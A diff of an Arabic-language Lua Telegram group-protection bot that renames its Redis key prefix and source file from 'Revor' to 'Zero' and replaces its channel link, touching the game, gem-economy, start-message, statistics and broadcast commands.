 katu = {"باي","فهمت","موزين","اسمعك","احبك","موحلو","نضيف","حاره","ناصي","جوه","سريع","ونسه","طويل","سمين","ضعيف","شريف","شجاع","رحت","عدل","نشيط","شبعان","موعطشان","خوش ولد","اني","هادئ"}
 name = katu[math.random(#katu)]
-Redis:set(Revor.."Revor:Game:Reflection"..msg.chat_id,name)
+Redis:set(Zero .."Zero :Game:Reflection"..msg.chat_id,name)
 name = string.gsub(name,"باي","هلو")
 name = string.gsub(name,"فهمت","مافهمت")
 name = string.gsub(name,"موزين","زين")
@@ -9716,7 +9719,7 @@ return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙اسرع واحد يدز ال�
 end
 end
 if text == "بات" or text == "محيبس" then   
-if Redis:get(Revor.."Revor:Status:Games"..msg.chat_id) then 
+if Redis:get(Zero .."Zero :Status:Games"..msg.chat_id) then 
 local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
@@ -9739,17 +9742,17 @@ return LuaTele.sendText(msg_chat_id,msg_id, [[*
 end
 end
 if text == "خمن" or text == "تخمين" then   
-if Redis:get(Revor.."Revor:Status:Games"..msg.chat_id) then
+if Redis:get(Zero .."Zero :Status:Games"..msg.chat_id) then
 Num = math.random(1,20)
-Redis:set(Revor.."Revor:Game:Estimate"..msg.chat_id..msg.sender.user_id,Num)  
+Redis:set(Zero .."Zero :Game:Estimate"..msg.chat_id..msg.sender.user_id,Num)  
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙اهلا بك عزيزي في لعبة التخمين :\nٴ━━━━━━━━━━\n".."⌔︙ملاحظه لديك { 3 } محاولات فقط فكر قبل ارسال تخمينك \n\n".."⌔︙سيتم تخمين عدد ما بين ال {1 و 20} اذا تعتقد انك تستطيع الفوز جرب واللعب الان ؟ ","md",true)  
 end
 end
 if text == "المختلف" then
-if Redis:get(Revor.."Revor:Status:Games"..msg.chat_id) then
+if Redis:get(Zero .."Zero :Status:Games"..msg.chat_id) then
 mktlf = {"😸","☠","🐼","🐇","🌑","🌚","⭐️","✨","⛈","🌥","⛄️","👨‍🔬","👨‍💻","👨‍🔧","🧚‍♀","??‍♂","🧝‍♂","🙍‍♂","🧖‍♂","👬","🕒","🕤","⌛️","📅",};
 name = mktlf[math.random(#mktlf)]
-Redis:set(Revor.."Revor:Game:Difference"..msg.chat_id,name)
+Redis:set(Zero .."Zero :Game:Difference"..msg.chat_id,name)
 name = string.gsub(name,"😸","😹😹😹😹😹😹😹😹😸😹😹😹😹")
 name = string.gsub(name,"☠","💀💀💀💀💀💀💀☠💀💀💀💀💀")
 name = string.gsub(name,"🐼","👻👻👻🐼👻👻👻👻👻👻👻")
@@ -9780,10 +9783,10 @@ return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙اسرع واحد يدز ال�
 end
 end
 if text == "امثله" then
-if Redis:get(Revor.."Revor:Status:Games"..msg.chat_id) then
+if Redis:get(Zero .."Zero :Status:Games"..msg.chat_id) then
 mthal = {"جوز","ضراطه","الحبل","الحافي","شقره","بيدك","سلايه","النخله","الخيل","حداد","المبلل","يركص","قرد","العنب","العمه","الخبز","بالحصاد","شهر","شكه","يكحله",};
 name = mthal[math.random(#mthal)]
-Redis:set(Revor.."Revor:Game:Example"..msg.chat_id,name)
+Redis:set(Zero .."Zero :Game:Example"..msg.chat_id,name)
 name = string.gsub(name,"جوز","ينطي____للماعده سنون")
 name = string.gsub(name,"ضراطه","الي يسوق المطي يتحمل___")
 name = string.gsub(name,"بيدك","اكل___محد يفيدك")
@@ -9812,7 +9815,7 @@ local NumGame = text:match("^بيع مجوهراتي (%d+)$")
 if tonumber(NumGame) == tonumber(0) then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙لا استطيع البيع اقل من 1 *","md",true)  
 end
-local NumberGame = Redis:get(Revor.."Revor:Num:Add:Games"..msg.chat_id..msg.sender.user_id)
+local NumberGame = Redis:get(Zero .."Zero :Num:Add:Games"..msg.chat_id..msg.sender.user_id)
 if tonumber(NumberGame) == tonumber(0) then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ليس لديك جواهر من الالعاب \n⌔︙اذا كنت تريد ربح الجواهر \n⌔︙ارسل الالعاب وابدأ اللعب ! ","md",true)  
 end
@@ -9820,13 +9823,13 @@ if tonumber(NumGame) > tonumber(NumberGame) then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙ليس لديك جواهر بهاذا العدد \n⌔︙لزيادة مجوهراتك في اللعبه \n⌔︙ارسل الالعاب وابدأ اللعب !","md",true)   
 end
 local NumberGet = (NumGame * 50)
-Redis:decrby(Revor.."Revor:Num:Add:Games"..msg.chat_id..msg.sender.user_id,NumGame)  
-Redis:incrby(Revor.."Revor:Num:Message:User"..msg.chat_id..":"..msg.sender.user_id,NumGame)  
+Redis:decrby(Zero .."Zero :Num:Add:Games"..msg.chat_id..msg.sender.user_id,NumGame)  
+Redis:incrby(Zero .."Zero :Num:Message:User"..msg.chat_id..":"..msg.sender.user_id,NumGame)  
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم خصم *~ { "..NumGame.." }* من مجوهراتك \n⌔︙وتم اضافة* ~ { "..(NumGame * 50).." } رساله الى رسالك *","md",true)  
 end 
 if text and text:match("^اضف مجوهرات (%d+)$") and msg.reply_to_message_id ~= 0 then
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if not msg.Addictive then
@@ -9840,12 +9843,12 @@ end
 if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
 end
-Redis:incrby(Revor.."Revor:Num:Add:Games"..msg.chat_id..Message_Reply.sender.user_id, text:match("^اضف مجوهرات (%d+)$"))  
+Redis:incrby(Zero .."Zero :Num:Add:Games"..msg.chat_id..Message_Reply.sender.user_id, text:match("^اضف مجوهرات (%d+)$"))  
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم اضافه له { "..text:match("^اضف مجوهرات (%d+)$").." } من المجوهرات").Reply,"md",true)  
 end
 if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id ~= 0 then
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if not msg.Addictive then
@@ -9859,11 +9862,11 @@ end
 if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
 end
-Redis:incrby(Revor.."Revor:Num:Message:User"..msg.chat_id..":"..Message_Reply.sender.user_id, text:match("^اضف رسائل (%d+)$"))  
+Redis:incrby(Zero .."Zero :Num:Message:User"..msg.chat_id..":"..Message_Reply.sender.user_id, text:match("^اضف رسائل (%d+)$"))  
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم اضافه له { "..text:match("^اضف رسائل (%d+)$").." } من الرسائل").Reply,"md",true)  
 end
 if text == "مجوهراتي" then 
-local Num = Redis:get(Revor.."Revor:Num:Add:Games"..msg.chat_id..msg.sender.user_id) or 0
+local Num = Redis:get(Zero .."Zero :Num:Add:Games"..msg.chat_id..msg.sender.user_id) or 0
 if Num == 0 then 
 return LuaTele.sendText(msg_chat_id,msg_id, "⌔︙لم تفز بأي مجوهره ","md",true)  
 else
@@ -9876,17 +9879,17 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Get:Reides:Commands:Group"..msg_chat_id..":"..'تعط','تعطيل الايدي بالصوره')
-Redis:set(Revor.."Revor:Get:Reides:Commands:Group"..msg_chat_id..":"..'تفع','تفعيل الايدي بالصوره')
-Redis:set(Revor.."Revor:Get:Reides:Commands:Group"..msg_chat_id..":"..'ا','ايدي')
-Redis:set(Revor.."Revor:Get:Reides:Commands:Group"..msg_chat_id..":"..'م','رفع مميز')
-Redis:set(Revor.."Revor:Get:Reides:Commands:Group"..msg_chat_id..":"..'اد', 'رفع ادمن')
-Redis:set(Revor.."Revor:Get:Reides:Commands:Group"..msg_chat_id..":"..'مد','رفع مدير')
-Redis:set(Revor.."Revor:Get:Reides:Commands:Group"..msg_chat_id..":"..'من', 'رفع منشئ')
-Redis:set(Revor.."Revor:Get:Reides:Commands:Group"..msg_chat_id..":"..'اس', 'رفع منشئ اساسي')
+Redis:set(Zero .."Zero :Get:Reides:Commands:Group"..msg_chat_id..":"..'تعط','تعطيل الايدي بالصوره')
+Redis:set(Zero .."Zero :Get:Reides:Commands:Group"..msg_chat_id..":"..'تفع','تفعيل الايدي بالصوره')
+Redis:set(Zero .."Zero :Get:Reides:Commands:Group"..msg_chat_id..":"..'ا','ايدي')
+Redis:set(Zero .."Zero :Get:Reides:Commands:Group"..msg_chat_id..":"..'م','رفع مميز')
+Redis:set(Zero .."Zero :Get:Reides:Commands:Group"..msg_chat_id..":"..'اد', 'رفع ادمن')
+Redis:set(Zero .."Zero :Get:Reides:Commands:Group"..msg_chat_id..":"..'مد','رفع مدير')
+Redis:set(Zero .."Zero :Get:Reides:Commands:Group"..msg_chat_id..":"..'من', 'رفع منشئ')
+Redis:set(Zero .."Zero :Get:Reides:Commands:Group"..msg_chat_id..":"..'اس', 'رفع منشئ اساسي')
 return LuaTele.sendText(msg_chat_id,msg_id,[[*
 ⌔︙تم ترتيب الاوامر بالشكل التالي •
 - ايدي - ا •
@@ -9907,19 +9910,19 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 print('Chat Id : '..msg_chat_id)
 print('User Id : '..msg_user_send_id)
 LuaTele.sendText(msg_chat_id,msg_id, "⌔︙ تم تحديث الملفات ♻","md",true)
-dofile('Revor.lua')  
+dofile('Zero.lua')  
 end
 if text == '/start' then
-Redis:sadd(Revor..'Revor:Num:User:Pv',msg.sender.user_id)  
+Redis:sadd(Zero ..'Zero :Num:User:Pv',msg.sender.user_id)  
 if not msg.ControllerBot then
-if not Redis:get(Revor.."Revor:Start:Bot") then
-local CmdStart = '*\n⌔︙أهلآ بك في بوت '..(Redis:get(Revor.."Revor:Name:Bot") or "السلطان")..
+if not Redis:get(Zero .."Zero :Start:Bot") then
+local CmdStart = '*\n⌔︙أهلآ بك في بوت '..(Redis:get(Zero .."Zero :Name:Bot") or "السلطان")..
 '\n⌔︙اختصاص البوت حماية المجموعات'..
 '\n⌔︙لتفعيل البوت عليك اتباع مايلي ...'..
 '\n⌔︙اضف البوت الى مجموعتك'..
@@ -9933,7 +9936,7 @@ data = {
 {text = '➕ اضفني لمجموعتك', url = 't.me/'..UserBot..'?startgroup=new'}, 
 },
 {
-{text = '- قناة السورس', url = 't.me/uui9u'}, 
+{text = '- قناة السورس', url = 't.me/zErOPro'}, 
 },
 }
 }
@@ -9946,11 +9949,11 @@ data = {
 {text = '➕ اضفني لمجموعتك', url = 't.me/'..UserBot..'?startgroup=new'}, 
 },
 {
-{text = '- قناة السورس', url = 't.me/uui9u'}, 
+{text = '- قناة السورس', url = 't.me/zErOPro'}, 
 },
 }
 }
-return LuaTele.sendText(msg_chat_id,msg_id,Redis:get(Revor.."Revor:Start:Bot"),"md",false, false, false, false, reply_markup)
+return LuaTele.sendText(msg_chat_id,msg_id,Redis:get(Zero .."Zero :Start:Bot"),"md",false, false, false, false, reply_markup)
 end
 else
 local reply_markup = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,
@@ -10026,17 +10029,17 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local list = Redis:smembers(Revor.."Revor:Num:User:Pv")   
+local list = Redis:smembers(Zero .."Zero :Num:User:Pv")   
 local x = 0
 for k,v in pairs(list) do  
 local Get_Chat = LuaTele.getChat(v)
 local ChatAction = LuaTele.sendChatAction(v,'Typing')
 if ChatAction.luatele ~= "ok" then
 x = x + 1
-Redis:srem(Revor..'Revor:Num:User:Pv',v)
+Redis:srem(Zero ..'Zero :Num:User:Pv',v)
 end
 end
 if x ~= 0 then
@@ -10050,20 +10053,20 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local list = Redis:smembers(Revor.."Revor:ChekBotAdd")   
+local list = Redis:smembers(Zero .."Zero :ChekBotAdd")   
 local x = 0
 for k,v in pairs(list) do  
 local Get_Chat = LuaTele.getChat(v)
 if Get_Chat.id then
-local statusMem = LuaTele.getChatMember(Get_Chat.id,Revor)
+local statusMem = LuaTele.getChatMember(Get_Chat.id,Zero )
 if statusMem.status.luatele == "chatMemberStatusMember" then
 x = x + 1
 LuaTele.sendText(Get_Chat.id,0,'*⌔︙البوت عظو في المجموعه سوف اغادر ويمكنك تفعيلي مره اخره *',"md")
-Redis:srem(Revor..'Revor:ChekBotAdd',Get_Chat.id)
-local keys = Redis:keys(Revor..'*'..Get_Chat.id)
+Redis:srem(Zero ..'Zero :ChekBotAdd',Get_Chat.id)
+local keys = Redis:keys(Zero ..'*'..Get_Chat.id)
 for i = 1, #keys do
 Redis:del(keys[i])
 end
@@ -10071,11 +10074,11 @@ LuaTele.leaveChat(Get_Chat.id)
 end
 else
 x = x + 1
-local keys = Redis:keys(Revor..'*'..v)
+local keys = Redis:keys(Zero ..'*'..v)
 for i = 1, #keys do
 Redis:del(keys[i])
 end
-Redis:srem(Revor..'Revor:ChekBotAdd',v)
+Redis:srem(Zero ..'Zero :ChekBotAdd',v)
 LuaTele.leaveChat(v)
 end
 end
@@ -10090,10 +10093,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:setex(Revor.."Revor:Change:Start:Bot"..msg.sender.user_id,300,true) 
+Redis:setex(Zero .."Zero :Change:Start:Bot"..msg.sender.user_id,300,true) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ ارسل لي كليشه Start الان ","md",true)  
 end
 if text == 'حذف كليشه ستارت ⌔' then 
@@ -10101,10 +10104,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Start:Bot") 
+Redis:del(Zero .."Zero :Start:Bot") 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم حذف كليشه Start ","md",true)   
 end
 if text == 'تغيير اسم البوت ⌔' then 
@@ -10112,10 +10115,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:setex(Revor.."Revor:Change:Name:Bot"..msg.sender.user_id,300,true) 
+Redis:setex(Zero .."Zero :Change:Name:Bot"..msg.sender.user_id,300,true) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ ارسل لي الاسم الان ","md",true)  
 end
 if text == 'حذف اسم البوت ⌔' then 
@@ -10123,10 +10126,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Name:Bot") 
+Redis:del(Zero .."Zero :Name:Bot") 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم حذف اسم البوت ","md",true)   
 end
 if text and text:match("^تعين عدد الاعضاء (%d+)$") then
@@ -10134,30 +10137,30 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor..'Revor:Num:Add:Bot',text:match("تعين عدد الاعضاء (%d+)$") ) 
+Redis:set(Zero ..'Zero :Num:Add:Bot',text:match("تعين عدد الاعضاء (%d+)$") ) 
 LuaTele.sendText(msg_chat_id,msg_id,'*⌔︙ تم تعيين عدد اعضاء تفعيل البوت اكثر من : '..text:match("تعين عدد الاعضاء (%d+)$")..' عضو *',"md",true)  
 elseif text =='الاحصائيات ⌔' then 
 if not msg.ControllerBot then 
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-LuaTele.sendText(msg_chat_id,msg_id,'*⌔︙عدد احصائيات البوت الكامله \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n⌔︙عدد المجموعات : '..(Redis:scard(Revor..'Revor:ChekBotAdd') or 0)..'\n⌔︙عدد المشتركين : '..(Redis:scard(Revor..'Revor:Num:User:Pv') or 0)..'*',"md",true)  
+LuaTele.sendText(msg_chat_id,msg_id,'*⌔︙عدد احصائيات البوت الكامله \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n⌔︙عدد المجموعات : '..(Redis:scard(Zero ..'Zero :ChekBotAdd') or 0)..'\n⌔︙عدد المشتركين : '..(Redis:scard(Zero ..'Zero :Num:User:Pv') or 0)..'*',"md",true)  
 end
 if text == 'تغغير كليشه المطور ⌔' then
 if not msg.ControllerBot then 
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor..'Revor:GetTexting:DevRevor'..msg_chat_id..':'..msg.sender.user_id,true)
+Redis:set(Zero ..'Zero :GetTexting:DevZero '..msg_chat_id..':'..msg.sender.user_id,true)
 return LuaTele.sendText(msg_chat_id,msg_id,'⌔︙ ارسل لي الكليشه الان')
 end
 if text == 'حذف كليشه المطور ⌔' then
@@ -10165,10 +10168,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor..'Revor:Texting:DevRevor')
+Redis:del(Zero ..'Zero :Texting:DevZero ')
 return LuaTele.sendText(msg_chat_id,msg_id,'⌔︙ تم حذف كليشه المطور')
 end
 if text == 'اضف رد عام ⌔' then 
@@ -10176,10 +10179,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Set:Rd"..msg.sender.user_id..":"..msg_chat_id,true)
+Redis:set(Zero .."Zero :Set:Rd"..msg.sender.user_id..":"..msg_chat_id,true)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ارسل الان الكلمه لاضافتها في ردود المطور ","md",true)  
 end
 if text == 'حذف رد عام ⌔' then 
@@ -10187,10 +10190,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Set:On"..msg.sender.user_id..":"..msg_chat_id,true)
+Redis:set(Zero .."Zero :Set:On"..msg.sender.user_id..":"..msg_chat_id,true)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ارسل الان الكلمه لحذفها من ردود المطور","md",true)  
 end
 if text=='اذاعه خاص ⌔' then 
@@ -10198,10 +10201,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:setex(Revor.."Revor:Broadcasting:Users" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
+Redis:setex(Zero .."Zero :Broadcasting:Users" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
 LuaTele.sendText(msg_chat_id,msg_id,[[
 ↯︙ارسل لي سواء كان 
 ❨ ملف • ملصق • متحركه • صوره
@@ -10218,10 +10221,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:setex(Revor.."Revor:Broadcasting:Groups" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
+Redis:setex(Zero .."Zero :Broadcasting:Groups" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
 LuaTele.sendText(msg_chat_id,msg_id,[[
 ↯︙ارسل لي سواء كان 
 ❨ ملف • ملصق • متحركه • صوره
@@ -10238,10 +10241,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
